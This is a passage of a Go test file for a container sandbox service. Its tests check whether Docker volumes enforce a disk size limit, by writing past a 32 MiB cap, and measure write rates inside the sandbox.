		if difference := hostFree - usage.FreeBytes; hostFree > 0 && (difference > hostFree/5 || -difference > hostFree/5) {
			t.Fatalf("the meter sees %d, the host %d: this is not the engine's disk", usage.FreeBytes, hostFree)
		}
	}
}

// TestAttackEvaluateFixedSizeVolume records whether this engine can make a volume with
// a real size limit. It asserts nothing: its log is the evidence for the design choice.
func TestAttackEvaluateFixedSizeVolume(t *testing.T) {
	ctx, cancel := context.WithTimeout(context.Background(), 3*time.Minute)
	defer cancel()
	values := baseEnv("attack-token-" + randomHex(16))
	config, err := LoadConfig(func(key string) string { return values[key] })
	if err != nil {
		t.Fatal(err)
	}
	for name, options := range map[string]map[string]string{
		"docker size": {"size": "32m"},
		"o=size":      {"o": "size=32m"},
		"local tmpfs": {"type": "tmpfs", "device": "tmpfs", "o": "size=32m"},
	} {
		volume := attackPrefix + "eval-" + randomHex(3)
		labels := map[string]string{LabelManaged: "true", LabelPrefix: strings.TrimRight(attackPrefix, "-")}
		_, createErr := attackDriver.do(ctx, http.MethodPost, "/volumes/create", map[string]any{"Name": volume, "DriverOpts": options, "Labels": labels}, nil)
		if createErr != nil {
			t.Logf("EVALUATION %s: volume create refused: %v", name, createErr)
			continue
		}
		container := volume + "-c"
		spec := ContainerSpec{Name: container, Image: config.Images[0], Runtime: config.Runtime, Labels: labels, Command: []string{"/bin/sh", "-c", initScript}, Network: NetworkNone, MemoryBytes: 1 << 30, NanoCPUs: 1e9, Pids: 256, Tmpfs: []TmpfsMount{{Path: "/tmp", SizeBytes: 1 << 20}}}
		spec.Volume = &VolumeMount{Name: volume, Path: WorkspacePath}
		if err := attackDriver.Create(ctx, spec); err != nil {
			t.Logf("EVALUATION %s: container start refused: %v", name, err)
		} else {
			stdout := &headBuffer{limit: 512}
			_, err := attackDriver.Exec(ctx, container, ExecRequest{Argv: []string{"/bin/sh", "-c", "head -c 100000000 /dev/zero > /workspace/x; echo write-status $?; stat -c %s /workspace/x"}, Stdout: stdout, Stderr: io.Discard})
			t.Logf("EVALUATION %s: wrote 100 MB against a 32 MiB limit: %s, err %v", name, strings.Join(strings.Fields(string(stdout.data)), " "), err)
		}
		_ = attackDriver.Remove(ctx, container)
		_ = attackDriver.RemoveVolume(ctx, volume)
	}
}

// TestAttackMeasureWriteRate reports the numbers the write window is stated from. It
// asserts nothing about speed, because that belongs to the disk the engine runs on.
func TestAttackMeasureWriteRate(t *testing.T) {
	env := quotaEnv(t, map[string]string{"KIONGA_SANDBOX_DISK_MB": "20480", "KIONGA_SANDBOX_DISK_CHECK_SECONDS": "300"})
	ref := env.sandbox(t)
	ctx, cancel := context.WithTimeout(context.Background(), 3*time.Minute)
	defer cancel()
	report := []string{}
	for _, mode := range []string{"fsync", "buffered"} {
		result := env.run(t, ref, `python3 - `+mode+` <<'PY'
import os, sys, time
sync = sys.argv[1] == "fsync"
block = os.urandom(1 << 20)
written, index, started = 0, 0, time.time()
while time.time() - started < 4:
    with open("/workspace/rate-%d" % index, "wb") as out:
        for _ in range(16):
            out.write(block)
            written += 1
            if written % 64 == 0:
                print(written, round(written / (time.time() - started)), flush=True)
        if sync:
            out.flush()
            os.fsync(out.fileno())
    index += 1
PY
rm -f /workspace/rate-*`, 60)
		last := strings.Fields(lastLines(result.Stdout, 1))
		report = append(report, fmt.Sprintf("%s: exit %d, %v (MiB written, MiB/s)", mode, result.ExitCode, last))
	}
	started := time.Now()
	if _, err := env.service.measure(ctx, ref.id, env.service.volumeName(ref.id)); err != nil {
		t.Fatal(err)
	}
	t.Logf("MEASURED under %s: %s; one meter takes %s", os.Getenv("KIONGA_ATTACK_RUNTIME"), strings.Join(report, "; "), time.Since(started).Round(time.Millisecond))
}
